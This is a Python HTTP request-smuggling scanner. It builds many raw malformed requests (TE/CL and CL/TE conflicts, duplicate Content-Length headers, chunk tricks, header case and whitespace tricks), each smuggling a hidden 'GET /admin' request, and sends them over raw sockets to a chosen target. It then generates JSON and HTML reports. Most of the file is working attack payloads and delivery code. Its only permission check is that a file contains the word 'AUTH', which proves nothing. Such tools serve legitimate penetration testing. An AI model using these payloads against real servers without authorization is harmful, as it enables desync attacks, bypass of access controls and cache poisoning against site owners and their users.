#!/usr/bin/python
"""
HTTP Desync (Request Smuggling) Scanner - upgraded
by nu11secur1ty 2025

Notes:
- This is your legacy-style scanner upgraded with many more payload variants
  (TE/CL permutations, chunk tricks, CL-mismatch, header-case/whitespace tricks).
- Supports --proxy (host:port) for HTTP proxying. For HTTPS target with proxy,
  the script will use CONNECT to establish a tunnel.
- Safety: requires --auth-file containing the word 'AUTH' (unless you use --allow-local and target=localhost).

Usage:
  # Dry-run (list templates)
  python3 http_desync_scanner.py --target example.com --auth-file permission.txt --dry-run

  # Real scan, saving JSON + HTML, using Burp running on localhost:8080 as proxy
  python3 http_desync_scanner.py --target example.com --port 80 --auth-file permission.txt --out report.json --html report.html --proxy 127.0.0.1:8080
"""
from __future__ import annotations
import argparse
import socket
import ssl
import time
import json
import html
import sys
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Dict, Optional

CRLF = "\r\n"
DEFAULT_USER_AGENT = "DesyncScanner/1.4"
logger = logging.getLogger("desync-scanner")


# -----------------------
# Logging / utilities
# -----------------------
def setup_logging(verbose: bool = False) -> None:
    handler = logging.StreamHandler()
    fmt = "[%(levelname)s] %(message)s"
    handler.setFormatter(logging.Formatter(fmt))
    logger.handlers = []
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)


def safe_read_file(path: str) -> str:
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except Exception as e:
        logger.debug("Cannot read file %s: %s", path, e)
        return ""


def require_auth_file(path: str) -> bool:
    content = safe_read_file(path)
    return "AUTH" in content.upper()


def parse_indicator_list(s: Optional[str]) -> List[str]:
    if not s:
        return []
    return [p.strip() for p in s.split(",") if p.strip()]


# -----------------------
# Payload helpers
# -----------------------
def join_lines(lines: List[str], trailing_body: bytes = b"") -> bytes:
    """Join header lines with CRLF and append the trailing body bytes."""
    return CRLF.join(lines).encode("utf-8") + CRLF.encode("utf-8") + trailing_body


# -----------------------
# Payload collection (expanded)
# -----------------------
def payload_te_cl(host: str, path: str = "/") -> bytes:
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: chunked",
        "Content-Length: 4",
        "",
    ]
    body = "0" + CRLF + CRLF
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    return join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))


def payload_cl_te(host: str, path: str = "/") -> bytes:
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 20",
        "Transfer-Encoding: chunked",
        "",
    ]
    body = "0" + CRLF + CRLF
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    return join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))


def payload_dup_cl_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # duplicate with zero / formatted zero
    l1 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 0",
        "content-length: 0000",
        "",
    ]
    variants.append(("dup_cl_0_0000", join_lines(l1)))
    # duplicate different values
    l2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 4",
        "Content-Length: 1000",
        "",
    ]
    variants.append(("dup_cl_4_1000", join_lines(l2)))
    # many duplicates (three)
    l3 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 2",
        "Content-Length: 2",
        "content-length: 02",
        "",
    ]
    variants.append(("dup_cl_three", join_lines(l3, b"AB")))
    return variants


def payload_whitespace_case(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # trailing space
    lines1 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 5 ",
        "",
    ]
    variants.append(("ws_trailing_space", join_lines(lines1, b"hello")))
    # mixed-case header
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "transfer-encoding: chunked",
        "",
    ]
    variants.append(("te_lowercase", join_lines(lines2, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
    # odd capitalization combo
    lines3 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: Chunked",
        "Content-Length: 4",
        "",
    ]
    body = "0" + CRLF + CRLF
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    variants.append(("te_cap_cl_ambig", join_lines(lines3, body.encode("utf-8") + poison.encode("utf-8"))))
    return variants


def payload_mixed_transfer(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # gzip, chunked combined
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: gzip, chunked",
        "",
    ]
    variants.append(("mix_te_gzip_chunked", join_lines(lines, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
    # duplicate TE lines
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: chunked",
        "Transfer-Encoding: identity",
        "",
    ]
    variants.append(("dup_te_chunked_identity", join_lines(lines2, b"0" + CRLF.encode("utf-8") + CRLF.encode("utf-8"))))
    return variants


def payload_chunk_tricks(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # small chunk then poison
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Transfer-Encoding: chunked",
        "",
    ]
    body = "1\r\nA\r\n0\r\n\r\n"
    poison = f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}"
    variants.append(("small_chunk_poison", join_lines(lines, body.encode("utf-8") + poison.encode("utf-8"))))
    # chunk extension
    body2 = "5;ext=1\r\nHELLO\r\n0\r\n\r\n"
    variants.append(("chunk_ext", join_lines(lines, body2.encode("utf-8") + poison.encode("utf-8"))))
    # extra CRLFs around terminator
    body3 = "0" + CRLF + CRLF + CRLF
    variants.append(("extra_crlf_terminator", join_lines(lines, body3.encode("utf-8") + poison.encode("utf-8"))))
    return variants


def payload_cl_mismatch(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    # big content-length declared, small body + poison
    lines1 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 100",
        "",
    ]
    body_and_poison = b"A" * 4 + (f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}").encode("utf-8")
    variants.append(("cl_too_large_then_poison", join_lines(lines1, body_and_poison)))
    # small content-length but long extra bytes
    lines2 = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 4",
        "",
    ]
    extra = b"A" * 8 + (f"GET /admin HTTP/1.1{CRLF}Host: {host}{CRLF}{CRLF}").encode("utf-8")
    variants.append(("cl_too_small_extra_then_poison", join_lines(lines2, extra)))
    return variants


def payload_http2_to_http1_hints(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    variants = []
    lines = [
        f"POST {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {DEFAULT_USER_AGENT}",
        "Content-Length: 12",
        "",
    ]
    body = b":method: GET\r\n:path: /admin\r\n"
    variants.append(("http2_pseudo_in_body", join_lines(lines, body)))
    return variants


def payload_variants(host: str, path: str = "/") -> List[Tuple[str, bytes]]:
    # aggregate many payloads
    templates: List[Tuple[str, bytes]] = []
    templates.append(("te_cl", payload_te_cl(host, path)))
    templates.append(("cl_te", payload_cl_te(host, path)))
    templates.extend(payload_dup_cl_variants(host, path))
    templates.extend(payload_whitespace_case(host, path))
    templates.extend(payload_mixed_transfer(host, path))
    templates.extend(payload_chunk_tricks(host, path))
    templates.extend(payload_cl_mismatch(host, path))
    templates.extend(payload_http2_to_http1_hints(host, path))

    # some small legacy extras
    extra = []
    extra.append(f"POST {path} HTTP/1.1")
    extra.append(f"Host: {host}")
    extra.append("User-Agent: DesyncScanner/1.4")
    extra.append("CONTENT-LENGTH: 0")
    extra.append("Content-Length: 0000")
    extra.append("")
    templates.append(("dup_cl_mixedcase", CRLF.join(extra).encode('utf-8') + CRLF.encode('utf-8')))
    return templates


# -----------------------
# Networking: raw socket + proxy support
# -----------------------
def send_raw(host: str, port: int, raw: bytes, use_ssl: bool=False, timeout: float=6.0, proxy: Optional[str]=None) -> Tuple[int, bytes]:
    proxy_host = proxy_port = None
    if proxy:
        try:
            proxy_host, proxy_port = proxy.split(":",1)
            proxy_port = int(proxy_port)
        except Exception as e:
            return (1, f"Invalid proxy format: {e}".encode('utf-8'))

    sock = None
    try:
        if proxy:
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            if use_ssl:
                connect_cmd = f"CONNECT {host}:{port} HTTP/1.1{CRLF}Host: {host}:{port}{CRLF}{CRLF}"
                sock.sendall(connect_cmd.encode('utf-8'))
                resp = b""
                sock.settimeout(timeout)
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if b"\r\n\r\n" in resp:
                        break
                if b"200" not in resp.split(b"\r\n",1)[0]:
                    sock.close()
                    return (1, b"Proxy CONNECT failed: " + resp[:1024])
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.settimeout(timeout)
                sock.sendall(raw)
            else:
                try:
                    raw_str = raw.decode('utf-8', errors='replace')
                    first_line, rest = raw_str.split("\r\n",1)
                    parts = first_line.split(" ",2)
                    if len(parts) >= 2:
                        method = parts[0]
                        path = parts[1]
                        abs_url = f"http://{host}:{port}{path}"
                        new_first = f"{method} {abs_url} HTTP/1.1"
                        new_raw = new_first + "\r\n" + rest
                        sock.sendall(new_raw.encode('utf-8'))
                    else:
                        sock.sendall(raw)
                except Exception:
                    sock.sendall(raw)
        else:
            sock = socket.create_connection((host, port), timeout=timeout)
            if use_ssl:
                ctx = ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.settimeout(timeout)
            sock.sendall(raw)

        chunks = []
        try:
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
        except socket.timeout:
            pass
        try:
            sock.close()
        except Exception:
            pass
        return (0, b"".join(chunks))
    except Exception as exc:
        try:
            if sock:
                sock.close()
        except Exception:
            pass
        return (1, str(exc).encode('utf-8'))


# -----------------------
# Analysis heuristics
# -----------------------
def analyze_response(template_name: str, sent: bytes, resp_bytes: bytes, indicators: Optional[List[str]]=None, large_threshold: int=15000) -> Dict:
    if indicators is None:
        indicators = []
    findings: Dict = {
        'template': template_name,
        'resp_len': len(resp_bytes),
        'resp_preview': resp_bytes[:2048].decode('latin-1', errors='replace'),
        'suspected': False,
        'reasons': [],
        'severity': 'green',
    }
    lower = resp_bytes.lower()
    if b'http/1.1' in lower[4:]:
        findings['suspected'] = True
        findings['reasons'].append('multiple_http_markers_in_response')
        if findings['severity'] == 'green':
            findings['severity'] = 'yellow'
    if len(resp_bytes) > large_threshold:
        findings['suspected'] = True
        findings['reasons'].append('very_large_response')
        if findings['severity'] == 'green':
            findings['severity'] = 'yellow'
    if b'/admin' in lower or b'admin' in lower:
        findings['suspected'] = True
        findings['reasons'].append('admin_string_in_response')
        findings['severity'] = 'red'
    for ind in indicators:
        if ind and ind.encode('utf-8').lower() in lower:
            findings['suspected'] = True
            findings['reasons'].append(f'indicator:{ind}')
            if findings['severity'] == 'green':
                findings['severity'] = 'yellow'
    return findings


# -----------------------
# HTML report generator (color-coded)
# -----------------------
def severity_badge_html(sev: str) -> str:
    if sev == 'red':
        color = '#b22222'; textcol = '#fff'
    elif sev == 'yellow':
        color = '#f39c12'; textcol = '#111'
    else:
        color = '#27ae60'; textcol = '#fff'
    return f'<span style="display:inline-block;padding:6px 10px;border-radius:6px;background:{color};color:{textcol};font-weight:700;">{sev.upper()}</span>'


def generate_html_report(report: Dict, html_path: str) -> None:
    counts = {'red':0,'yellow':0,'green':0}
    for r in report.get('results', []):
        sev = r.get('severity','green')
        counts[sev] = counts.get(sev,0) + 1

    rows = []
    for r in report.get('results', []):
        sev = r.get('severity','green')
        badge = severity_badge_html(sev)
        reasons = ', '.join(r.get('reasons', [])) or 'None'
        preview = html.escape(r.get('resp_preview',''))
        border = '#b22222' if sev=='red' else ('#f39c12' if sev=='yellow' else '#27ae60')
        row = f"""
        <div style="border:1px solid #e6e9ee;border-left:6px solid {border};border-radius:8px;padding:12px;margin:8px 0;background:#fff;">
          <div style="display:flex;justify-content:space-between;align-items:center;">
            <div style="font-family:Inter,Segoe UI,Arial,Helvetica,sans-serif;font-size:16px;font-weight:700;">Template: {html.escape(str(r.get('template')))}</div>
            <div>{badge}</div>
          </div>
          <div style="margin-top:8px;color:#333;font-family:monospace;white-space:pre-wrap;max-height:240px;overflow:auto;border-top:1px dashed #eee;padding-top:8px;">{preview}</div>
          <div style="margin-top:8px;color:#666;font-size:13px;">Reasons: {html.escape(reasons)} | Response length: {r.get('resp_len')}</div>
        </div>
        """
        rows.append(row)

    html_doc = f"""<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>HTTP Desync Scanner Report - {html.escape(report.get('target',''))}</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>body{{background:#f6f8fa;padding:24px;font-family:Inter,Segoe UI,Arial,Helvetica,sans-serif;color:#0b1220}} .card{{background:#fff;padding:12px;border-radius:8px}}</style>
</head>
<body>
  <div class="card">
    <h2 style="margin:0 0 8px 0">HTTP Desync Scanner Report</h2>
    <div style="color:#556">Target: {html.escape(report.get('target',''))}:{report.get('port')} Path: {html.escape(report.get('path','/'))} Generated: {html.escape(time.ctime(report.get('timestamp', time.time())))}</div>
    <div style="margin-top:10px">RED=HIGH: {counts['red']} &nbsp; YELLOW=MEDIUM: {counts['yellow']} &nbsp;GREEN=LOW: {counts['green']}</div>
  </div>
  <div style="margin-top:18px">
    {''.join(rows)}
  </div>
</body>
</html>
"""
    try:
        with open(html_path, 'w', encoding='utf-8') as fh:
            fh.write(html_doc)
        logger.info("HTML report written to %s", html_path)
    except Exception as e:
        logger.error("Failed to write HTML report: %s", e)


# -----------------------
# Scanner core
# -----------------------
def scan_target(host: str, port: int, path: str, use_ssl: bool, concurrency: int, timeout: float, proxy: Optional[str], indicators: List[str], large_threshold: int, templates_only: bool=False) -> Dict:
    templates = payload_variants(host, path)
    results = []

    def worker(name_raw: Tuple[str, bytes]) -> Dict:
        name, raw = name_raw
        status, resp = send_raw(host, port, raw, use_ssl=use_ssl, timeout=timeout, proxy=proxy)
        if status != 0:
            return {'template': name, 'error': resp.decode('utf-8', errors='replace'), 'resp_len': 0, 'resp_preview': '', 'suspected': False, 'reasons': [], 'severity': 'green'}
        analysis = analyze_response(name, raw, resp, indicators, large_threshold)
        return analysis

    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = {ex.submit(worker, t): t[0] for t in templates}
        for fut in as_completed(futures):
            try:
                r = fut.result()
            except Exception as e:
                r = {'template': futures[fut], 'error': str(e), 'resp_len': 0, 'resp_preview': '', 'suspected': False, 'reasons': [], 'severity': 'green'}
            results.append(r)

    report = {
        'target': host,
        'port': port,
        'path': path,
        'use_ssl': use_ssl,
        'timestamp': int(time.time()),
        'results': results,
    }
    return report


# -----------------------
# CLI
# -----------------------
def create_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="HTTP Desync (Request Smuggling) Scanner — upgraded")
    p.add_argument('--target', required=True, help='Target hostname or IP')
    p.add_argument('--port', type=int, default=80, help='TCP port (default 80)')
    p.add_argument('--path', default='/', help='Path used in templates')
    p.add_argument('--ssl', action='store_true', help='Use TLS (HTTPS)')
    p.add_argument('--proxy', default=None, help='Optional proxy host:port (use Burp at 127.0.0.1:8080)')
    p.add_argument('--concurrency', type=int, default=4)
    p.add_argument('--timeout', type=float, default=8.0)
    p.add_argument('--auth-file', required=True, help='File proving authorization (must contain AUTH)')
    p.add_argument('--out', default='desync_report.json', help='JSON output file')
    p.add_argument('--html', default=None, help='HTML output file (optional)')
    p.add_argument('--dry-run', action='store_true', help='List templates only')
    p.add_argument('--indicators', default=None, help='Comma-separated strings to flag (e.g. admin,reset,password)')
    p.add_argument('--large-threshold', type=int, default=15000, help='Bytes considered "very large"')
    p.add_argument('--verbose', action='store_true')
    return p


def main(argv: Optional[List[str]] = None) -> None:
    parser = create_parser()
    args = parser.parse_args(argv)
    setup_logging(args.verbose)

    # safety
    if not args.auth_file or not require_auth_file(args.auth_file):
        logger.error("Auth file missing/invalid. Place a file containing 'AUTH' to confirm permission.")
        sys.exit(2)

    if args.dry_run:
        tpls = payload_variants(args.target, args.path)
        print(json.dumps({'target': args.target, 'port': args.port, 'templates': [t[0] for t in tpls]}, indent=2))
        return

    indicators = parse_indicator_list(args.indicators)
    logger.info("Starting scan %s:%d%s (ssl=%s) proxy=%s", args.target, args.port, args.path, args.ssl, args.proxy)
    report = scan_target(args.target, args.port, args.path, args.ssl, args.concurrency, args.timeout, args.proxy, indicators, args.large_threshold)

    # write JSON
    try:
        with open(args.out, 'w', encoding='utf-8') as fh:
            json.dump(report, fh, indent=2)
        logger.info("JSON report written to %s", args.out)
    except Exception as e:
        logger.error("Failed to write JSON report: %s", e)

    # html
    if args.html:
        generate_html_report(report, args.html)

    # summary
    for r in report.get('results', []):
        if r.get('suspected'):
            logger.info("Suspected: %s reasons=%s severity=%s", r.get('template'), r.get('reasons'), r.get('severity'))
    logger.info("Scan finished. JSON=%s HTML=%s", args.out, args.html or 'none')


if __name__ == '__main__':
    main()
